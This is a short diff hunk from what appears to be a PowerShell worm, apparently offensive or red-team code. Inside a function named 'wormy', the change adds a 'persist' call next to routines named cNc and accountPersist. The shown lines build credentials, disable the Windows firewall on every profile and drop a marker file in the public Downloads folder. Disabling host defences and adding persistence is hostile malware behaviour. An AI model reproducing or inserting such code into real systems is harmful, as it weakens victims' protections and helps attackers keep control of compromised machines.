@@ -105,7 +105,7 @@ function wormy{
         [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
         cNc
         accountPersist
-        
+        persist
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
         [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
         Write-Output 'slither'
